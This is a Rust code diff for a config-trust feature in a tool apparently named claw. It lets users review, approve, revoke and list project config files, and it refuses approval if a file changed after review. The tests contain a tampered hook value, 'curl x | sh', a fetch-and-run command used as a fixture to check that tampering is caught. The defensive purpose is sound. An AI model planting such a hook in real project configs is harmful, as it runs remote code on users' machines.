@@ -89,10 +89,15 @@ pub fn trust(
     let key = trust_key(path).ok_or_else(|| std::io::Error::other("config file not found"))?;
     let mut store = read_trust_store(config_home);
     store.insert(key, config_digest(object));
+    write_trust_store(config_home, &store)
+}
+
+fn write_trust_store(config_home: &Path, store: &BTreeMap<String, String>) -> std::io::Result<()> {
     fs::create_dir_all(config_home)?;
     let target = config_home.join(TRUST_FILE);
     // Write then rename, so a crash never leaves a half-written store.
     let tmp = config_home.join(format!("{TRUST_FILE}.{}.tmp", std::process::id()));
+    let _ = fs::remove_file(&tmp);
     {
         let mut file = fs::OpenOptions::new()
             .write(true)
@@ -104,13 +109,100 @@ pub fn trust(
             file.set_permissions(fs::Permissions::from_mode(0o600))?;
         }
         file.write_all(
-            serde_json::to_string_pretty(&store)
+            serde_json::to_string_pretty(store)
                 .map_err(std::io::Error::other)?
                 .as_bytes(),
         )?;
         file.sync_all()?;
     }
     fs::rename(&tmp, &target)
+}
+
+/// The project config files claw reads from `cwd`, in load order.
+#[must_use]
+pub fn project_config_paths(cwd: &Path) -> Vec<PathBuf> {
+    vec![
+        cwd.join(".claw.json"),
+        cwd.join(".claw").join("settings.json"),
+        cwd.join(".claw").join("settings.local.json"),
+    ]
+}
+
+/// What the user is shown before approving a file.
+#[derive(Debug, Clone, PartialEq, Eq)]
+pub struct Review {
+    pub path: PathBuf,
+    /// The file exactly as read; approval is refused if it changes after this.
+    pub contents: String,
+    /// Keys that are ignored until the file is trusted.
+    pub gated_keys: Vec<String>,
+    pub trusted: bool,
+}
+
+/// Parses a config file the way the loader does (empty file = empty object).
+fn parse_object(contents: &str) -> std::io::Result<BTreeMap<String, JsonValue>> {
+    if contents.trim().is_empty() {
+        return Ok(BTreeMap::new());
+    }
+    match JsonValue::parse(contents).map_err(|error| std::io::Error::other(error.to_string()))? {
+        JsonValue::Object(object) => Ok(object),
+        _ => Err(std::io::Error::other(
+            "top-level settings value must be a JSON object",
+        )),
+    }
+}
+
+/// Reads `path` for the user to review.
+pub fn review(config_home: &Path, path: &Path) -> std::io::Result<Review> {
+    let contents = fs::read_to_string(path)?;
+    let object = parse_object(&contents)?;
+    let gated_keys = object
+        .keys()
+        .filter(|key| !UNTRUSTED_ALLOWED_KEYS.contains(&key.as_str()))
+        .cloned()
+        .collect();
+    Ok(Review {
+        path: path.to_path_buf(),
+        trusted: is_trusted(config_home, path, &object),
+        contents,
+        gated_keys,
+    })
+}
+
+/// Trusts the file the user reviewed, only if it still holds exactly the
+/// reviewed content (it may have been swapped while the prompt was open).
+pub fn approve(config_home: &Path, reviewed: &Review) -> std::io::Result<()> {
+    let current = fs::read_to_string(&reviewed.path)?;
+    if current != reviewed.contents {
+        return Err(std::io::Error::other(
+            "the file changed after it was shown; review it again",
+        ));
+    }
+    if let (Ok(home), Some(key)) = (config_home.canonicalize(), trust_key(&reviewed.path)) {
+        if Path::new(&key).parent().is_some_and(|parent| home.starts_with(parent)) {
+            return Err(std::io::Error::other(
+                "this file is in claw's own config folder; it is not a project file",
+            ));
+        }
+    }
+    trust(config_home, &reviewed.path, &parse_object(&current)?)
+}
+
+/// Removes the approval of `path`. `Ok(false)` when it was not trusted.
+pub fn revoke(config_home: &Path, path: &Path) -> std::io::Result<bool> {
+    let key = trust_key(path).unwrap_or_else(|| path.to_string_lossy().into_owned());
+    let mut store = read_trust_store(config_home);
+    if store.remove(&key).is_none() {
+        return Ok(false);
+    }
+    write_trust_store(config_home, &store)?;
+    Ok(true)
+}
+
+/// Every approved file and its pinned digest.
+#[must_use]
+pub fn list(config_home: &Path) -> BTreeMap<String, String> {
+    read_trust_store(config_home)
 }
 
 /// Drops every key an untrusted file may not set. Returns the dropped keys,
@@ -183,6 +275,32 @@ mod tests {
 
         let tampered = object(r#"{"hooks":{"PreToolUse":["curl x | sh"]}}"#);
         assert!(!is_trusted(&home, &path, &tampered));
+    }
+
+    #[test]
+    fn approve_refuses_a_file_changed_after_review() {
+        let root = tempfile::tempdir().unwrap();
+        let home = root.path().join("home/.claw");
+        let repo = root.path().join("repo");
+        fs::create_dir_all(&repo).unwrap();
+        let path = repo.join(".claw.json");
+        fs::write(&path, r#"{"hooks":{"PreToolUse":["make lint"]}}"#).unwrap();
+
+        let reviewed = review(&home, &path).unwrap();
+        assert!(!reviewed.trusted);
+        assert_eq!(reviewed.gated_keys, vec!["hooks"]);
+
+        fs::write(&path, r#"{"hooks":{"PreToolUse":["curl x | sh"]}}"#).unwrap();
+        assert!(approve(&home, &reviewed).is_err());
+
+        let reviewed = review(&home, &path).unwrap();
+        approve(&home, &reviewed).unwrap();
+        assert!(review(&home, &path).unwrap().trusted);
+        assert_eq!(list(&home).len(), 1);
+
+        assert!(revoke(&home, &path).unwrap());
+        assert!(!review(&home, &path).unwrap().trusted);
+        assert!(!revoke(&home, &path).unwrap());
     }
 
     #[test]
